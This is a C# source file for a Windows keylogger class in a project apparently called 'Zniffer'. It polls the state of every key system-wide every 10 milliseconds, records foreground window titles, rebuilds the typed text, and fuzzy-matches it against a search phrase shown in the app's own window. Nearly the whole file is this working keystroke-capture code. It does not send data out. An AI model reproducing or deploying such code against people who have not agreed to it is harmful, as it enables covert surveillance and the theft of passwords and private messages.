using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Windows.Input;
using System.ComponentModel;
using System.Globalization;
using System.Threading;
using CustomExtensions;

namespace Zniffer {
    class KeyLogger {

        //event raised when key is pressed
        public delegate void keyCaptured(string s);
        public event keyCaptured RaiseKeyCapturedEvent;

        public static System.Timers.Timer resetStringTimer = new System.Timers.Timer(5000);//5sec reset time

        private string keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private string handleCurrentWindow;
        private string handlePrevWindow;

        #region modifiers
        static bool shift = false;
        static bool control = false;
        static bool alt = false;
        #endregion

        static string registryKey = "Zniffer";

        #region Keylogger
        public static string loggedKeyString = "";
        public static long cursorPosition = 0;
        #endregion

        string decimalSeparator = new CultureInfo(Thread.CurrentThread.CurrentCulture.Name, false).NumberFormat.NumberDecimalSeparator;



        private MainWindow window;

        public KeyLogger(MainWindow window) {
            this.window = window;
            keyBuffer = string.Empty;

            timerKeyMine = new System.Timers.Timer();
            timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(getPressedKeys);
            timerKeyMine.Interval = 10;
            timerKeyMine.Enabled = true;

            resetStringTimer.Elapsed += new System.Timers.ElapsedEventHandler(OnResetTimerEvent);
        }

        public void OnResetTimerEvent(object source, System.Timers.ElapsedEventArgs e) {
            cursorPosition = 0;
            loggedKeyString = "";

        }

        private void KeyCapturedHandle(string s) {
            //limit number of chars in string
            //limit exceeded = slice string and overlap two parts for Levenshtein

            if (s.Substring(0, 1).Equals("<") && s.Substring(s.Length - 1, 1).Equals(">")) {//special characters
                s = s.Substring(1, s.Length - 2);
                if (s.Equals("Backspace")) {
                    resetStringTimer.Stop();
                    if (loggedKeyString.Length > 0) {
                        loggedKeyString = loggedKeyString.Remove(loggedKeyString.Length - 1);
                        cursorPosition--;
                    }
                }
                else if (s.Equals("Left")) {
                    resetStringTimer.Stop();

                    if (cursorPosition > 0)
                        cursorPosition--;
                }
                else if (s.Equals("Right")) {
                    resetStringTimer.Stop();

                    if (cursorPosition < loggedKeyString.Length)
                        cursorPosition++;
                }
            }
            else if (s.Substring(0, 1).Equals("[") && s.Substring(s.Length - 1, 1).Equals("]")) {//active window changed
                resetStringTimer.Stop();

            }
            else {//normal characters
                resetStringTimer.Stop();

                loggedKeyString += s;
                cursorPosition++;

                if (s.Equals("\n")) {//user returned(ended) string
                    cursorPosition = 0;
                    loggedKeyString = "";
                }
            }
            //Console.Out.WriteLine(loggedKeyString);
            //THISREF.AddTextToClipBoardBox(Searcher.ExtractPhrase(loggedKeyString));

            string phrase = MainWindow.SearchPhrase;
            //way to change levenshtein methode
            LevenshteinMatches result = loggedKeyString.Levenshtein(phrase, mode: LevenshteinMode.SplitForSingleMatrixCPU);

            if (result !=null && result.hasMatches) {
                window.AddTextToClipBoardBox(result);
            }

            resetStringTimer.Start();
        }


        public static string GetForegroundApplication() {
            IntPtr handle = GetForegroundWindow();
            StringBuilder title = new StringBuilder(1024);
            int len = GetWindowText(handle, title, title.Capacity);
            if ((len <= 0) || (len > title.Length))
                return "unknown";
            return title.ToString();
        }

        public void getPressedKeys(object sender, System.Timers.ElapsedEventArgs easd) {
            handleCurrentWindow = GetForegroundApplication();

            if (handleCurrentWindow != handlePrevWindow) {//focuse changed
                KeyCapturedHandle("[" + handleCurrentWindow + "]");
                handlePrevWindow = handleCurrentWindow;
            }

            foreach (int i in Enum.GetValues(typeof(Keys))) {
                if (GetAsyncKeyState(i) == -32767) {

                    bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                    bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;

                    if (ControlKeyActive) {
                        control = true;
                    }
                    if (AltKeyActive) {
                        alt = true;
                    }

                    if ((CapsLock || ShiftKeyActive) && !(CapsLock && ShiftKeyActive))
                        shift = true;


                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        KeyCapturedHandle("<LMouse>");
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        KeyCapturedHandle("<RMouse>");
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        KeyCapturedHandle("<Backspace>");
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        KeyCapturedHandle(" ");
                    else if (Enum.GetName(typeof(Keys), i) == "Return")
                        KeyCapturedHandle("\n");
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        KeyCapturedHandle("<Del>");
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        KeyCapturedHandle("<Ins>");
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        KeyCapturedHandle("<Home>");
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        KeyCapturedHandle("<End>");
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        KeyCapturedHandle("<Tab>");
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        KeyCapturedHandle("<Page Up>");
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        KeyCapturedHandle("<Page Down>");
                    else if (Enum.GetName(typeof(Keys), i) == "LWin")
                        KeyCapturedHandle("<LWin>");
                    else if (Enum.GetName(typeof(Keys), i) == "RWin")
                        KeyCapturedHandle("<RWin>");
                    else if (Enum.GetName(typeof(Keys), i) == "CapsLock")
                        KeyCapturedHandle("<CapsLock>");
                    else if (Enum.GetName(typeof(Keys), i) == "Apps")
                        KeyCapturedHandle("<Apps>");
                    else if (Enum.GetName(typeof(Keys), i) == "PrintScreen")
                        KeyCapturedHandle("<PrintScreen>");
                    else if (Enum.GetName(typeof(Keys), i) == "NumLock")
                        KeyCapturedHandle("<NumLock>");
                    else if (Enum.GetName(typeof(Keys), i) == "Scroll")
                        KeyCapturedHandle("<Scroll>");
                    else if (Enum.GetName(typeof(Keys), i) == "Escape")
                        KeyCapturedHandle("<Escape>");
                    else if (Enum.GetName(typeof(Keys), i) == "LMenu")
                        KeyCapturedHandle("<LeftAlt>");
                    else if (Enum.GetName(typeof(Keys), i) == "Menu")
                        KeyCapturedHandle("<Alt>");
                    else if (Enum.GetName(typeof(Keys), i) == "RMenu")
                        KeyCapturedHandle("<RightAlt>");
                    else if (Enum.GetName(typeof(Keys), i) == "Pause")
                        KeyCapturedHandle("<Pause>");
                    else if (Enum.GetName(typeof(Keys), i) == "Clear")
                        KeyCapturedHandle("<Clear>");
                    else if (Enum.GetName(typeof(Keys), i) == "Up")
                        KeyCapturedHandle("<Up>");
                    else if (Enum.GetName(typeof(Keys), i) == "Down")
                        KeyCapturedHandle("<Down>");
                    else if (Enum.GetName(typeof(Keys), i) == "Left")
                        KeyCapturedHandle("<Left>");
                    else if (Enum.GetName(typeof(Keys), i) == "Right")
                        KeyCapturedHandle("<Right>");
                    else if (Enum.GetName(typeof(Keys), i) == "F12")
                        KeyCapturedHandle("<F12>");
                    else if (Enum.GetName(typeof(Keys), i) == "F11")
                        KeyCapturedHandle("<F11>");
                    else if (Enum.GetName(typeof(Keys), i) == "F10")
                        KeyCapturedHandle("<F10>");
                    else if (Enum.GetName(typeof(Keys), i) == "F9")
                        KeyCapturedHandle("<F9>");
                    else if (Enum.GetName(typeof(Keys), i) == "F8")
                        KeyCapturedHandle("<F8>");
                    else if (Enum.GetName(typeof(Keys), i) == "F7")
                        KeyCapturedHandle("<F7>");
                    else if (Enum.GetName(typeof(Keys), i) == "F6")
                        KeyCapturedHandle("<F6>");
                    else if (Enum.GetName(typeof(Keys), i) == "F5")
                        KeyCapturedHandle("<F5>");
                    else if (Enum.GetName(typeof(Keys), i) == "F4")
                        KeyCapturedHandle("<F4>");
                    else if (Enum.GetName(typeof(Keys), i) == "F3")
                        KeyCapturedHandle("<F3>");
                    else if (Enum.GetName(typeof(Keys), i) == "F2")
                        KeyCapturedHandle("<F2>");
                    else if (Enum.GetName(typeof(Keys), i) == "F1")
                        KeyCapturedHandle("<F1>");
                    else {
                        KeysConverter kc = new KeysConverter();
                        string keyChar = kc.ConvertToString(i);

                        if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
                            keyChar = ",";

                        if (!shift) {
                            keyChar = keyChar.ToLower();


                            if (string.Equals(keyChar, "oemminus", StringComparison.OrdinalIgnoreCase))
                                keyChar = "-";
                            else if (string.Equals(keyChar, "oemplus", StringComparison.OrdinalIgnoreCase))
                                keyChar = "=";
                            else if (string.Equals(keyChar, "oemtilde", StringComparison.OrdinalIgnoreCase))
                                keyChar = "`";
                            else if (string.Equals(keyChar, "oemopenbrackets", StringComparison.OrdinalIgnoreCase))
                                keyChar = "[";
                            else if (string.Equals(keyChar, "oem6", StringComparison.OrdinalIgnoreCase))
                                keyChar = "]";
                            else if (string.Equals(keyChar, "oem5", StringComparison.OrdinalIgnoreCase))
                                keyChar = @"\";
                            else if (string.Equals(keyChar, "oem7", StringComparison.OrdinalIgnoreCase))
                                keyChar = "'";
                            else if (string.Equals(keyChar, "oem1", StringComparison.OrdinalIgnoreCase))
                                keyChar = ";";
                            else if (string.Equals(keyChar, "oemquestion", StringComparison.OrdinalIgnoreCase))
                                keyChar = "/";
                            else if (string.Equals(keyChar, "oemperiod", StringComparison.OrdinalIgnoreCase))
                                keyChar = ".";
                            else if (string.Equals(keyChar, "oemcomma", StringComparison.OrdinalIgnoreCase))
                                keyChar = ",";
                            else if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
                                keyChar = decimalSeparator;

                            else if (string.Equals(keyChar, "numpad1", StringComparison.OrdinalIgnoreCase))
                                keyChar = "1";
                            else if (string.Equals(keyChar, "numpad2", StringComparison.OrdinalIgnoreCase))
                                keyChar = "2";
                            else if (string.Equals(keyChar, "numpad3", StringComparison.OrdinalIgnoreCase))
                                keyChar = "3";
                            else if (string.Equals(keyChar, "numpad4", StringComparison.OrdinalIgnoreCase))
                                keyChar = "4";
                            else if (string.Equals(keyChar, "numpad5", StringComparison.OrdinalIgnoreCase))
                                keyChar = "5";
                            else if (string.Equals(keyChar, "numpad6", StringComparison.OrdinalIgnoreCase))
                                keyChar = "6";
                            else if (string.Equals(keyChar, "numpad7", StringComparison.OrdinalIgnoreCase))
                                keyChar = "7";
                            else if (string.Equals(keyChar, "numpad8", StringComparison.OrdinalIgnoreCase))
                                keyChar = "8";
                            else if (string.Equals(keyChar, "numpad9", StringComparison.OrdinalIgnoreCase))
                                keyChar = "9";
                            else if (string.Equals(keyChar, "numpad0", StringComparison.OrdinalIgnoreCase))
                                keyChar = "0";



                        } else {
                            keyChar = keyChar.ToUpper();

                            if (string.Equals(keyChar, "oemminus", StringComparison.OrdinalIgnoreCase))
                                keyChar = "_";
                            else if (string.Equals(keyChar, "oemplus", StringComparison.OrdinalIgnoreCase))
                                keyChar = "=";
                            else if (string.Equals(keyChar, "oemtilde", StringComparison.OrdinalIgnoreCase))
                                keyChar = "~";
                            else if (string.Equals(keyChar, "oemopenbrackets", StringComparison.OrdinalIgnoreCase))
                                keyChar = "{";
                            else if (string.Equals(keyChar, "oem6", StringComparison.OrdinalIgnoreCase))
                                keyChar = "}";
                            else if (string.Equals(keyChar, "oem5", StringComparison.OrdinalIgnoreCase))
                                keyChar = "|";
                            else if (string.Equals(keyChar, "oem7", StringComparison.OrdinalIgnoreCase))
                                keyChar = "\"";
                            else if (string.Equals(keyChar, "oem1", StringComparison.OrdinalIgnoreCase))
                                keyChar = ":";
                            else if (string.Equals(keyChar, "oemquestion", StringComparison.OrdinalIgnoreCase))
                                keyChar = "?";
                            else if (string.Equals(keyChar, "oemperiod", StringComparison.OrdinalIgnoreCase))
                                keyChar = ">";
                            else if (string.Equals(keyChar, "oemcomma", StringComparison.OrdinalIgnoreCase))
                                keyChar = "<";
                            else if (string.Equals(keyChar, "decimal", StringComparison.OrdinalIgnoreCase))
                                keyChar = "<Del>";
                            else if (string.Equals(keyChar, "1", StringComparison.OrdinalIgnoreCase))
                                keyChar = "!";
                            else if (string.Equals(keyChar, "2", StringComparison.OrdinalIgnoreCase))
                                keyChar = "@";
                            else if (string.Equals(keyChar, "3", StringComparison.OrdinalIgnoreCase))
                                keyChar = "#";
                            else if (string.Equals(keyChar, "4", StringComparison.OrdinalIgnoreCase))
                                keyChar = "$";
                            else if (string.Equals(keyChar, "5", StringComparison.OrdinalIgnoreCase))
                                keyChar = "%";
                            else if (string.Equals(keyChar, "6", StringComparison.OrdinalIgnoreCase))
                                keyChar = "^";
                            else if (string.Equals(keyChar, "7", StringComparison.OrdinalIgnoreCase))
                                keyChar = "&";
                            else if (string.Equals(keyChar, "8", StringComparison.OrdinalIgnoreCase))
                                keyChar = "*";
                            else if (string.Equals(keyChar, "9", StringComparison.OrdinalIgnoreCase))
                                keyChar = "(";
                            else if (string.Equals(keyChar, "0", StringComparison.OrdinalIgnoreCase))
                                keyChar = ")";

                        }

                        if (string.Equals(keyChar, "divide", StringComparison.OrdinalIgnoreCase))
                            keyChar = "/";
                        else if (string.Equals(keyChar, "multiply", StringComparison.OrdinalIgnoreCase))
                            keyChar = "*";
                        else if (string.Equals(keyChar, "subtract", StringComparison.OrdinalIgnoreCase))
                            keyChar = "-";
                        else if (string.Equals(keyChar, "add", StringComparison.OrdinalIgnoreCase))
                            keyChar = "+";
                        else if (string.Equals(keyChar, "enter", StringComparison.OrdinalIgnoreCase))
                            keyChar = "\n";

                        if (alt) {
                            if (string.Equals(keyChar, "a", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ą";
                            else if (string.Equals(keyChar, "z", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ż";
                            else if (string.Equals(keyChar, "x", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ź";
                            else if (string.Equals(keyChar, "c", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ć";
                            else if (string.Equals(keyChar, "e", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ę";
                            else if (string.Equals(keyChar, "s", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ś";
                            else if (string.Equals(keyChar, "n", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ń";
                            else if (string.Equals(keyChar, "o", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ó";
                            else if (string.Equals(keyChar, "l", StringComparison.OrdinalIgnoreCase))
                                keyChar = "ł";

                        }


                        //"{" + Convert.ToInt32(control) + Convert.ToInt32(alt) + "}" + 0 false 1 true

                        KeyCapturedHandle(keyChar);
                    }

                    control = shift = alt = false;
                }

            }
        }

        #region ToggleKeys
        public static bool ControlKeyActive {// ControlKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.ControlKey) & 0x8000); }
        }
        public static bool ShiftKeyActive {// ShiftKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000); }
        }
        public static bool AltKeyActive {// AltKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.Menu) & 0x8000); }
        }
        #endregion

        #region DllImports
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        #endregion
    }
}
